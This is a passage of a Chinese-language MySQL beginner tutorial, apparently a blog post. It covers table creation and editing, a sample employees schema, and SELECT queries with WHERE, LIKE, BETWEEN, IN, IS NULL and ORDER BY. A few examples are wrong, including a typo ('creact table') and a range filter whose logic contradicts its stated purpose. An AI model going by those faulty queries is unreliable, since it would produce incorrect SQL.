<h5 id="新建表"><a href="#新建表" class="headerlink" title="新建表"></a>新建表</h5><h5 id="create-table-表名"><a href="#create-table-表名" class="headerlink" title="create table 表名;"></a>create table 表名;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式：creact table 表名(</span><br><span class="line">		列名 列类型,</span><br><span class="line">		列名 列类型</span><br><span class="line">		...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用create table 创建一个handsome的表，表是由列组成的，加一个id列，这个列的类型是int类型，还有一个name列，它的类型是字符串，varchar，20表示可以存储最多20个字符，也就是字符串的最大长度，varchar是可变字符串的意思</span><br><span class="line">mysql&gt; create table handsome(</span><br><span class="line">    -&gt; id int,</span><br><span class="line">    -&gt; name varchar(20));</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">#用show tables;查看当前库中的表</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+----------------+</span><br><span class="line">| Tables_in_test |</span><br><span class="line">+----------------+</span><br><span class="line">| handsome       |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop table 表名;</span><br></pre></td></tr></table></figure>

<h5 id="查看表的结构"><a href="#查看表的结构" class="headerlink" title="查看表的结构"></a>查看表的结构</h5><h5 id="desc-表名"><a href="#desc-表名" class="headerlink" title="desc 表名;"></a>desc 表名;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用desc产看了handsome表的结构</span><br><span class="line">mysql&gt; desc handsome;</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field | Type        | Null | Key | Default | Extra |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| id    | int(11)     | YES  |     | NULL    |       |</span><br><span class="line">| name  | varchar(20) | YES  |     | NULL    |       |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<h5 id="查看当前表的数据"><a href="#查看当前表的数据" class="headerlink" title="查看当前表的数据"></a>查看当前表的数据</h5><h5 id="select-from-表名"><a href="#select-from-表名" class="headerlink" title="select * from 表名;"></a>select * from 表名;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 当前handsome表里并没有数据 </span><br><span class="line">mysql&gt; select * from handsome;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="向表中插入数据"><a href="#向表中插入数据" class="headerlink" title="向表中插入数据"></a>向表中插入数据</h5><h5 id="insert-into-表名-values-插入内容"><a href="#insert-into-表名-values-插入内容" class="headerlink" title="insert into 表名() values (插入内容);"></a>insert into 表名() values (插入内容);</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line">mysql&gt; insert into handsome (id,name) values(1,&#39;john&#39;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into handsome (id,name) values(2,&#39;rose&#39;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"># 用 select * from handsome;查看当前表的内容</span><br><span class="line">mysql&gt; select * from handsome;</span><br><span class="line">+------+------+</span><br><span class="line">| id   | name |</span><br><span class="line">+------+------+</span><br><span class="line">|    1 | john |</span><br><span class="line">|    2 | rose |</span><br><span class="line">+------+------+</span><br></pre></td></tr></table></figure>

<h5 id="修改表中内容"><a href="#修改表中内容" class="headerlink" title="修改表中内容"></a>修改表中内容</h5><h5 id="update-表名-set-字段-’更改内容’-where-列名-序号"><a href="#update-表名-set-字段-’更改内容’-where-列名-序号" class="headerlink" title="update 表名 set 字段=’更改内容’ where 列名=序号;"></a>update 表名 set 字段=’更改内容’ where 列名=序号;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update handsome set name&#x3D;&#39;MySQL&#39; where id&#x3D;1;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line"># 用select *form handsome;查看handsome表中的内容</span><br><span class="line">mysql&gt; select * from handsome;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">|    1 | MySQL |</span><br><span class="line">|    2 | rose  |</span><br><span class="line">+------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="删除表中内容"><a href="#删除表中内容" class="headerlink" title="删除表中内容"></a>删除表中内容</h5><h5 id="delete-from-表名-where-列名-序列号"><a href="#delete-from-表名-where-列名-序列号" class="headerlink" title="delete from 表名 where 列名=序列号;"></a>delete from 表名 where 列名=序列号;</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#删除handsome表中的id列中的1序列号内容，</span><br><span class="line">mysql&gt; delete from handsome where id&#x3D;1;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from handsome;</span><br><span class="line">+------+------+</span><br><span class="line">| id   | name |</span><br><span class="line">+------+------+</span><br><span class="line">|    2 | rose |</span><br><span class="line">+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="查看MySQL当前版本"><a href="#查看MySQL当前版本" class="headerlink" title="查看MySQL当前版本"></a>查看MySQL当前版本</h5><h5 id="1、select-version"><a href="#1、select-version" class="headerlink" title="1、select version();"></a>1、select version();</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#第一种方法，用select version();查看当前版本，version是版本的意思，说明当前版本是5.5</span><br><span class="line">#第一种方法实在MySQL客户端上查看</span><br><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="2、mysql-version-简写形式：mysql-V"><a href="#2、mysql-version-简写形式：mysql-V" class="headerlink" title="2、mysql -version    简写形式：mysql -V"></a>2、mysql -version    简写形式：mysql -V</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#退出mysql后，再当前命令行用mysql --version查看版本，版本还是5.5</span><br><span class="line">D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql --version</span><br><span class="line">mysql  Ver 14.14 Distrib 5.5.53, for Win32 (AMD64)</span><br><span class="line"></span><br><span class="line">D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql -V</span><br><span class="line">mysql  Ver 14.14 Distrib 5.5.53, for Win32 (AMD64)</span><br></pre></td></tr></table></figure>

<h4 id="MySQL的语法规范"><a href="#MySQL的语法规范" class="headerlink" title="MySQL的语法规范"></a>MySQL的语法规范</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、不区分大小写，建议关键字大写，表名、列名小写</span><br><span class="line">2、每条命令最好用分号结尾</span><br><span class="line">3、每条命令根据需要，可以进行缩进 或 换行(命令过长时，可以使用换行，如果换行，建议关键字单独一行)</span><br><span class="line">4、注释</span><br><span class="line">	单行注释:#注释文字</span><br><span class="line">	单行注释:-- 注释文字(注意，--后有空格)</span><br><span class="line">	多行注释:&#x2F;* 注释文字 *&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="myemployees库四张表介绍"><a href="#myemployees库四张表介绍" class="headerlink" title="myemployees库四张表介绍"></a>myemployees库四张表介绍</h3><h4 id="employees表-员工表"><a href="#employees表-员工表" class="headerlink" title="employees表 | 员工表"></a>employees表 | 员工表</h4><table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>employee_id  int(6)</td>
<td>员工编号</td>
</tr>
<tr>
<td>first_name，varchar(20)</td>
<td>名</td>
</tr>
<tr>
<td>last_name， varchar(25)</td>
<td>姓（姓名）</td>
</tr>
<tr>
<td>email，varchar(25)</td>
<td>邮箱</td>
</tr>
<tr>
<td>phone_number， varchar(20)</td>
<td>电话号码</td>
</tr>
<tr>
<td>job_id， varchar(10)</td>
<td>工种编号</td>
</tr>
<tr>
<td>salary， double(10,2)</td>
<td>月薪</td>
</tr>
<tr>
<td>commission_pct， double(4,2)</td>
<td>奖金率</td>
</tr>
<tr>
<td>manager_id， int(6)</td>
<td>上级领导的员工编号</td>
</tr>
<tr>
<td>department_id， int(4)</td>
<td>部门编号</td>
</tr>
<tr>
<td>hiredate， datetime</td>
<td>入职时间</td>
</tr>
</tbody></table>
<h4 id="departments表-部门表"><a href="#departments表-部门表" class="headerlink" title="departments表 | 部门表"></a>departments表 | 部门表</h4><table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>department_id</td>
<td>部门编号</td>
</tr>
<tr>
<td>department_name</td>
<td>部门名称</td>
</tr>
<tr>
<td>manager_id</td>
<td>部门领导的员工编号</td>
</tr>
<tr>
<td>location_id</td>
<td>位置编号</td>
</tr>
</tbody></table>
<h4 id="locations表-位置表"><a href="#locations表-位置表" class="headerlink" title="locations表 | 位置表"></a>locations表 | 位置表</h4><table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>location_id</td>
<td>位置编号</td>
</tr>
<tr>
<td>street_address</td>
<td>街道地址</td>
</tr>
<tr>
<td>postal_code</td>
<td>邮编地址</td>
</tr>
<tr>
<td>city</td>
<td>城市</td>
</tr>
<tr>
<td>state_province</td>
<td>省</td>
</tr>
<tr>
<td>country_id</td>
<td>国家编号</td>
</tr>
</tbody></table>
<h4 id="jobs表-职位"><a href="#jobs表-职位" class="headerlink" title="jobs表 | 职位"></a>jobs表 | 职位</h4><table>
<thead>
<tr>
<th>列名</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>job_id</td>
<td>职位编号</td>
</tr>
<tr>
<td>job_title</td>
<td>职位名称</td>
</tr>
<tr>
<td>min_salary</td>
<td>最低工资</td>
</tr>
<tr>
<td>max_salary</td>
<td>最高工资</td>
</tr>
</tbody></table>
<h3 id="DQL语言"><a href="#DQL语言" class="headerlink" title="DQL语言"></a>DQL语言</h3><h4 id="基础查询（重点）"><a href="#基础查询（重点）" class="headerlink" title="基础查询（重点）"></a>基础查询（重点）</h4><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><p>​    select  查询列表  from 表名;    </p>
<h5 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h5><h5 id="1、查询列表可以是：表中的字段，常量值、表达式、函数"><a href="#1、查询列表可以是：表中的字段，常量值、表达式、函数" class="headerlink" title="1、查询列表可以是：表中的字段，常量值、表达式、函数"></a>1、查询列表可以是：表中的字段，常量值、表达式、函数</h5><h5 id="2、查询的结果是一个虚拟的表格"><a href="#2、查询的结果是一个虚拟的表格" class="headerlink" title="2、查询的结果是一个虚拟的表格"></a>2、查询的结果是一个虚拟的表格</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">着重号&#96; &#96;位置在数字一旁边,用于区分 &#39;关键字&#39;和&#39;字段&#39;的</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、查询表中的单个字段</span><br><span class="line">#last_name是employees表中的字段，如果不加FROM employees会出错</span><br><span class="line">mysql&gt; SELECT last_name FROM employees;</span><br><span class="line"></span><br><span class="line">2、查询表中的多个字段</span><br><span class="line">#查询多个字段每个字段中间用&#39;,&#39;逗号隔开</span><br><span class="line">mysql&gt; SELECT last_name,salary,email FROM employees;</span><br><span class="line"></span><br><span class="line">3、查询表中所有字段</span><br><span class="line">#查询employees所有字段</span><br><span class="line">mysql&gt; SELECT * FROM employees;</span><br><span class="line">还有一种方法，像第二步一样，将所有字段都打上，然后查询。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4、查询常量值</span><br><span class="line">#100只是一个普通的常量值，并不是来自某个表所以不需要加FROM</span><br><span class="line">mysql&gt; SELECT 100;	#还会返回结果，只不过它显示的字段名就是它本身</span><br><span class="line">+-----+</span><br><span class="line">| 100 |</span><br><span class="line">+-----+</span><br><span class="line">| 100 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">查询字符型常量值</span><br><span class="line"></span><br><span class="line"># MySQL中是不区分字符和字符串的，只要是字符都认为是字符型</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &#39;jock&#39;;</span><br><span class="line">+------+</span><br><span class="line">| jock |</span><br><span class="line">+------+</span><br><span class="line">| jock |</span><br><span class="line">+------+</span><br><span class="line">注意:字符型和日期型的常量值必须用引号引起来，数值型不需要</span><br><span class="line"></span><br><span class="line">5、查询表达式</span><br><span class="line"></span><br><span class="line"># 用SELECT 计算表达式也是可以的(+、-、*、&#x2F;、%...)算数运算符都可以用</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT 100*98;</span><br><span class="line">+--------+</span><br><span class="line">| 100*98 |</span><br><span class="line">+--------+</span><br><span class="line">|   9800 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">6、查询函数</span><br><span class="line"># 函数最关键的标志就是&#39;()&#39;小括号，之前的VERSION()就是一个函数</span><br><span class="line"># 查看版本号</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT VERSION();</span><br><span class="line">+-----------+</span><br><span class="line">| VERSION() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">7、为字段起别名</span><br><span class="line">优点：</span><br><span class="line">	便于理解，提高可读性</span><br><span class="line">	如果要查询的字段有重名情况，使用别名可以区分。</span><br><span class="line"></span><br><span class="line">方式一：使用AS</span><br><span class="line">#格式 SELECT 内容(列表) AS 名称(别名)</span><br><span class="line">mysql&gt; SELECT 100%98 AS 结果;</span><br><span class="line">+------+</span><br><span class="line">| 结果     |</span><br><span class="line">+------+</span><br><span class="line">|    2 |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"># 将employees数据库中的last_name 和 first_name 分别起名 &#39;姓&#39;和&#39;名&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT last_name AS 姓,first_name AS 名 FROM employees;</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| 姓            | 名            |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| K_ing       | Steven      |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方式二：使用空格，不需要使用AS</span><br><span class="line">mysql&gt; SELECT last_name 姓,first_name 名 FROM employees;</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| 姓            | 名            |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| K_ing       | Steven      |</span><br><span class="line"></span><br><span class="line">特殊情况</span><br><span class="line">	案例：给last_name起一个别名out put</span><br><span class="line">	#如果这样运行会报错，因为中间有特殊符号 &#39;空格&#39;，MySQL不理解当前内容</span><br><span class="line">	mysql&gt; SELECT last_name AS out put from employees;</span><br><span class="line">	修改：</span><br><span class="line">	#将有特殊符号的别名用(&quot;&quot;)双引号引起来，当然，这里着重号(&#39;&#39;)也是可以的。</span><br><span class="line">	mysql&gt; SELECT last_name AS &quot;out put&quot; from employees;</span><br><span class="line">	</span><br><span class="line">8、去重 distinct</span><br><span class="line">语法：</span><br><span class="line">	SELECT DISTINCT 字段名 FROM 表名;</span><br><span class="line"></span><br><span class="line">案例：查询员工表中涉及到的所有部门编号</span><br><span class="line"># 其中有很多重复的编号</span><br><span class="line">mysql&gt; SELECT department_id FROM employees;</span><br><span class="line">+---------------+</span><br><span class="line">| department_id |</span><br><span class="line">+---------------+</span><br><span class="line">|          NULL |</span><br><span class="line">|            10 |</span><br><span class="line">|            20 |</span><br><span class="line">|            20 |</span><br><span class="line">|            30 |</span><br><span class="line">|            30 |</span><br><span class="line"></span><br><span class="line"># 这样就将重复的数字去除了</span><br><span class="line">mysql&gt; select distinct department_id from employees;</span><br><span class="line">+---------------+</span><br><span class="line">| department_id |</span><br><span class="line">+---------------+</span><br><span class="line">|          NULL |</span><br><span class="line">|            10 |</span><br><span class="line">|            20 |</span><br><span class="line">|            30 |</span><br><span class="line">|            40 |</span><br><span class="line">注意:去重不能用于多个字段，只能用于单字段</span><br><span class="line"></span><br><span class="line">9、+号的作用</span><br><span class="line">在其他编程语言中+号是运算符，也是拼接符，</span><br><span class="line">而在MySQL中+号：</span><br><span class="line">		只有一个功能:运算符</span><br><span class="line">select 100+90; 	  两个操作数都是数值时，则做加法运算</span><br><span class="line">select &#39;123&#39;+90;  只要其中一方为字符型，试图将字符型转换成数值型</span><br><span class="line">				  如果转换成功，则继续做加法运算</span><br><span class="line">select &#39;john&#39;+90; 如果转换失败，则将字符型数值转换成0</span><br><span class="line">select null+90;   只要其中一方为null，则结果肯定为null</span><br><span class="line"></span><br><span class="line">案例：查询员工名和姓连接成一个字段，并显示为 姓名</span><br><span class="line">#虽然没报错，但是输出结果全是0，原因是+号和我们想象的不一样，这里并不是拼接的意思</span><br><span class="line">	mysql&gt; SELECT last_name+first_name AS 姓名 FROM employees;</span><br><span class="line">+------+</span><br><span class="line">| 姓名     |</span><br><span class="line">+------+</span><br><span class="line">|    0 |	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【补充】concat函数</span><br><span class="line">在MySQL中做拼接就不能用+号了而是用到一个函数CONCAT函数</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT CONCAT(last_name,first_name) AS 姓名 FROM employees;</span><br><span class="line">+------------------+</span><br><span class="line">| 姓名                 |</span><br><span class="line">+------------------+</span><br><span class="line">| K_ingSteven      |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【补充】ifnull函数</span><br><span class="line"></span><br><span class="line">IFNULL()函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回指定的值，如果不为 NULL 则返回原来的的值</span><br><span class="line"># 用IFNULL判断时候为null，结果为null返回0，不为null返回本身</span><br><span class="line">mysql&gt; SELECT CONCAT(first_name,&#39;,&#39;,last_name,&#39;,&#39;,IFNULL(commission_pct,0)) AS out_put FROM employees;</span><br><span class="line">+------------------------+</span><br><span class="line">| out_put                |</span><br><span class="line">+------------------------+</span><br><span class="line">| Steven,K_ing,0.00      |</span><br><span class="line">| Neena,Kochhar,0.00     |</span><br><span class="line">| John,Russell,0.40      |</span><br><span class="line"></span><br><span class="line">【补充】isnull函数</span><br><span class="line">判断某字段表达式是否为null，如果是，则返回1，否则返回0</span><br><span class="line">SELECT CONCAT(first_name,&#39;,&#39;,last_name,&#39;,&#39;,ISNULL(commission_pct,0)) AS out_put FROM employees;</span><br></pre></td></tr></table></figure>

<h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&gt;和!&#x3D;都是不等于的意思</span><br><span class="line">语法：</span><br><span class="line">	SELECT 查询列表 FROM 表名	WHERE 筛选条件;  #这里的where可以理解为if的意思</span><br><span class="line">	</span><br><span class="line">分类:</span><br><span class="line">	一、按条件表达式筛选(条件运算符):&gt;、&lt;、&#x3D;、&lt;&gt;(!&#x3D;)、&gt;&#x3D;、&lt;&#x3D;  #其中&lt;&gt;表示不等于，也可以用!&#x3D; </span><br><span class="line">	二、按逻辑表达式筛选(逻辑运算符):and、or、not</span><br><span class="line">	三、模糊查询:like、between and、in、is null</span><br></pre></td></tr></table></figure>

<h5 id="1、按条件表达式筛选"><a href="#1、按条件表达式筛选" class="headerlink" title="1、按条件表达式筛选"></a>1、按条件表达式筛选</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询工资&gt;12000的员工信息</span><br><span class="line">mysql&gt; SELECT * FROM employees WHERE salary&gt;12000;</span><br><span class="line">  案例二:查询部门编号不等于90号的员工名和部门编号</span><br><span class="line">mysql&gt; SELECT last_name,department_id FROM employees WHERE department_id&lt;&gt;90;</span><br></pre></td></tr></table></figure>

<h5 id="2、按逻辑表达式筛选"><a href="#2、按逻辑表达式筛选" class="headerlink" title="2、按逻辑表达式筛选"></a>2、按逻辑表达式筛选</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询工资在1w到2w之间的员工名、工资、以及奖金</span><br><span class="line">mysql&gt; SELECT</span><br><span class="line">    -&gt; last_name,salary,commission_pct</span><br><span class="line">    -&gt; FROM</span><br><span class="line">    -&gt; employees</span><br><span class="line">    -&gt; WHERE</span><br><span class="line">    -&gt; salary&gt;&#x3D;10000 AND salary&lt;&#x3D;20000;</span><br><span class="line">    </span><br><span class="line">案例一:查询部门编号不是在90到110之间，或者工资高于15000的员工信息</span><br><span class="line"> SELECT</span><br><span class="line">    -&gt; department_id,salary</span><br><span class="line">    -&gt; FROM</span><br><span class="line">    -&gt; employees</span><br><span class="line">    -&gt; WHERE</span><br><span class="line">    -&gt; department_id&lt;90 AND department_id&gt;110 OR salary&lt;15000;</span><br><span class="line">   	#还有一种是</span><br><span class="line">    -&gt; NOT(department_id&gt;&#x3D;90 AND department_id&lt;&#x3D;110) OR salary&lt;15000;</span><br></pre></td></tr></table></figure>

<h4 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h4><h5 id="一、like"><a href="#一、like" class="headerlink" title="一、like"></a>一、like</h5><h5 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h5><ul>
<li><h5 id="一般和通配符搭配使用"><a href="#一般和通配符搭配使用" class="headerlink" title="一般和通配符搭配使用"></a>一般和通配符搭配使用</h5></li>
<li><h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符:"></a>通配符:</h5><ul>
<li><h5 id="任意多个字符，包含0个字符"><a href="#任意多个字符，包含0个字符" class="headerlink" title="% 任意多个字符，包含0个字符"></a>% 任意多个字符，包含0个字符</h5></li>
<li><h5 id="任意单个字符"><a href="#任意单个字符" class="headerlink" title="_ 任意单个字符"></a>_ 任意单个字符</h5></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">		</span><br><span class="line">案例一:查询员工名中包含字符a的员工信息</span><br><span class="line">#a是字符用引号引起，%代表通配符</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM employees WHERE last_name like &#39;%a%&#39;;</span><br><span class="line"></span><br><span class="line">案例二:查询员工名中第三个字符为n，第五个字符为l的员工名和工资</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT salary,last_name FROM employees WHERE last_name LIKE &#39;__n_l%&#39;;</span><br><span class="line">+---------+-----------+</span><br><span class="line">| salary  | last_name |</span><br><span class="line">+---------+-----------+</span><br><span class="line">| 9000.00 | Hunold    |</span><br><span class="line">+---------+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">案例三:查询员工名中第二个字符为下划线的 </span><br><span class="line">#可以用反斜杠转义</span><br><span class="line">mysql&gt; SELECT last_name FROM employees WHERE last_name LIKE &#39;_\_%&#39;;</span><br><span class="line">+-----------+</span><br><span class="line">| last_name |</span><br><span class="line">+-----------+</span><br><span class="line">| K_ing     |</span><br><span class="line">| K_ing     |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">escape方法</span><br><span class="line">#可以不用反斜杠使用任意字符，然后再后面加一个 ESCAPE关键字，将之前的字符引起来就可以</span><br><span class="line">mysql&gt; SELECT last_name FROM employees WHERE last_name LIKE &#39;_^_%&#39; ESCAPE &#39;^&#39;;</span><br></pre></td></tr></table></figure>

<h5 id="二、between-and"><a href="#二、between-and" class="headerlink" title="二、between and"></a>二、between and</h5><p>1、使用between and 可以提高语句的简洁度</p>
<p>2、包含临界值</p>
<p>3、两个临界值不能调换顺序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例1:查询员工编号100到120之间的员工信息</span><br><span class="line">#这样就不需要像之前用and一样，每个数值前都需要加上字段名</span><br><span class="line">现在:mysql&gt; SELECT employee_id FROM employees WHERE employee_id BETWEEN 100 AND 120;</span><br><span class="line"></span><br><span class="line">#之前:mysql&gt; SELECT employee_id FROM employees WHERE employee_id&gt;&#x3D;100 AND employee_id&lt;&#x3D;120;</span><br><span class="line"></span><br><span class="line">not between and</span><br><span class="line">mysql&gt; SELECT last_name,salary FROM employees WHERE salary NOT BETWEEN 8000 and 17000</span><br></pre></td></tr></table></figure>

<h5 id="三、in"><a href="#三、in" class="headerlink" title="三、in"></a>三、in</h5><h5 id="含义-判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or"><a href="#含义-判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or" class="headerlink" title="含义:判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or"></a>含义:判断某一字段的值是否属于in列表中的某一项，只要满足其中一项就可以，类似于or</h5><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点:"></a>特点:</h5><h5 id="1、使用in提高了语句的简洁度"><a href="#1、使用in提高了语句的简洁度" class="headerlink" title="1、使用in提高了语句的简洁度"></a>1、使用in提高了语句的简洁度</h5><h5 id="2、in列表的值类型必须统一或者兼容"><a href="#2、in列表的值类型必须统一或者兼容" class="headerlink" title="2、in列表的值类型必须统一或者兼容"></a>2、in列表的值类型必须统一或者兼容</h5><h5 id="3、in列表不支持通配符"><a href="#3、in列表不支持通配符" class="headerlink" title="3、in列表不支持通配符"></a>3、in列表不支持通配符</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例:查询员工的工种编号是 IT_PROG、AD_VP中的一个员工名和工种编号</span><br><span class="line">现在:mysql&gt; SELECT last_name,job_id FROM employees WHERE job_id IN (&#39;IT_PROG&#39;,&#39;AD_VP&#39;);</span><br><span class="line"></span><br><span class="line">之前:mysql&gt; SELECT last_name,job_id FROM employees WHERE job_id&#x3D;&#39;IT_PROG&#39; OR job_id&#x3D;&#39;AD_VP&#39;;</span><br></pre></td></tr></table></figure>

<h5 id="四、is-null"><a href="#四、is-null" class="headerlink" title="四、is null"></a>四、is null</h5><h5 id="或者-lt-gt-不能用于判断null值"><a href="#或者-lt-gt-不能用于判断null值" class="headerlink" title="= 或者 &lt;&gt; 不能用于判断null值"></a>= 或者 &lt;&gt; 不能用于判断null值</h5><h5 id="is-null-或-is-not-null-可以判断null值"><a href="#is-null-或-is-not-null-可以判断null值" class="headerlink" title="is null 或 is not null 可以判断null值"></a>is null 或 is not null 可以判断null值</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询没有奖金的员工名和奖金率</span><br><span class="line">mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct IS NULL;</span><br><span class="line">查询有奖金的:</span><br><span class="line">mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct IS NOT NULL;</span><br></pre></td></tr></table></figure>

<h5 id="安全等于-lt-gt"><a href="#安全等于-lt-gt" class="headerlink" title="安全等于    &lt;=&gt;"></a>安全等于    &lt;=&gt;</h5><p>是判断是否等于，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例一:查询没有奖金的员工名和奖金率</span><br><span class="line">mysql&gt; SELECT last_name,commission_pct FROM employees WHERE commission_pct &lt;&#x3D;&gt; NULL;</span><br><span class="line"></span><br><span class="line">案例二:查询工资12000的员工信息</span><br><span class="line">mysql&gt; SELECT last_name,salary FROM employees WHERE salary &lt;&#x3D;&gt; 12000;</span><br></pre></td></tr></table></figure>

<h4 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">提点:</span><br><span class="line">	1、ASC是升序 DESC是降序，如果不写，默认是升序</span><br><span class="line">	2、order by子句中可以支持单个字段、多个字段、表达式、函数、别名</span><br><span class="line">	3、order by子句一般是放在查询语句的最后面，limit语句除外</span><br><span class="line">	</span><br><span class="line">语法一:</span><br><span class="line">	SELECT 查询列表 FROM 表 【WHERE 筛选条件】 ORDER BY 排序列表  |【ASC | DESC】</span><br><span class="line"></span><br><span class="line">案例:查询员工信息，要求工资从高到低排序  | 从低到高只需要把DESC修改成ASC就可以</span><br><span class="line">mysql&gt; SELECT * FROM employees WHERE salary ORDER BY salary DESC;</span><br><span class="line"></span><br><span class="line">案例二:查询部门编号&gt;&#x3D;90的员工信息,按入职时间的先后进行排序【添加筛选条件】</span><br><span class="line">mysql&gt; SELECT department_id,hiredate FROM employees WHERE department_id&gt;&#x3D;90 ORDER BY hiredate ASC;</span><br><span class="line"></span><br><span class="line">案例三:按年薪的高低显示员工的信息和年薪【按表达式排序】</span><br><span class="line">mysql&gt; SELECT *,salary*12*(1+IFNULL(commission_pct,0)) 年薪</span><br><span class="line">    -&gt; FROM employees</span><br><span class="line">    -&gt; ORDER BY salary*12*(1+IFNULL(commission_pct,0)) DESC;</span><br><span class="line">    </span><br><span class="line">案例四:按年薪的高低显示员工的信息和年薪【按别名排序】</span><br><span class="line">mysql&gt; SELECT *,salary*12*(1+IFNULL(commission_pct,0)) 年薪</span><br><span class="line">    -&gt; FROM employees</span><br><span class="line">    -&gt; ORDER BY 年薪 DESC;</span><br><span class="line">   </span><br><span class="line">案例五:按姓名的长度显示员工的姓名和工资【按函数排序】</span><br><span class="line">lenth()函数可以显示字符长度</span><br><span class="line">mysql&gt; SELECT LENGTH(last_name) 字节长度,last_name,salary FROM employees ORDER BY LENGTH(last_name);</span><br><span class="line"></span><br><span 